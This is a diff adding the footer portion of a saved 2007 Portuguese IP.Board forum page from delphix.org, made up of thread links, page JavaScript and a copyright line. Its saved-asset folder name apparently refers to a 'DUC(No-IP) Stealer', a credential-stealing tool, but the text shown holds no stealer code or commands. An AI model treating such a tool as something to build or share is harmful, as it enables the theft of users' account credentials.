+  <a href="http://www.delphix.org/forum/index.php?act=usercp&amp;CODE=start_subs&amp;method=topic&amp;tid=1120">Assinar este tópico</a> ·
+  <a href="http://www.delphix.org/forum/index.php?act=Forward&amp;f=10&amp;t=1120">Enviar este tópico</a> ·
+  <a href="http://www.delphix.org/forum/index.php?act=Print&amp;client=printer&amp;f=10&amp;t=1120">Imprimir este tópico</a> ·
+  <a href="http://www.delphix.org/forum/index.php?act=usercp&amp;CODE=start_subs&amp;method=forum&amp;fid=10">Assinar este fórum</a>
+  </div>
+ </div>
+ <br>
+
+</div>
+<script type="text/javascript">
+//<![CDATA[
+document.getElementById('topicoptionsjs').style.display = 'none';
+ 
+// Scroll to PID?
+topic_scroll_to_post( parseInt("0") );
+//]]>
+</script><!--TASK--><img src="DUC%28No-IP%29%20Stealer_arquivos/index.gif" alt="" border="0" height="1" width="1"><!--ETASK-->
+<table id="gfooter" cellspacing="0">
+	<tbody><tr>
+		<td width="45%"> </td>
+		<td align="center" nowrap="nowrap" width="10%"><a href="http://www.delphix.org/forum/lofiversion/index.php?t1120.html"><b>Versão Simples</b></a></td>
+		<td align="right" nowrap="nowrap" width="45%">Horário: 16th December 2007 - 18:58</td>
+	</tr>
+</tbody></table>
+<script type="text/javascript">
+//<![CDATA[
+menu_do_global_init();
+show_inline_messages();
+// Uncomment this to fix IE png images
+// causes page slowdown, and some missing images occasionally
+// if ( is_ie )
+// {
+//	 ie_fix_png();
+// }
+
+//]]>
+</script>
+ 
+<!-- Copyright Information -->
+        				  <div class="copyright" align="center">
+        				  	Powered By IP.Board
+        				  	2.3.1 © 2007 &nbsp;IPS, Inc.
+        				  </div>
+		<!-- / Copyright -->
+</div>
+</body></html>
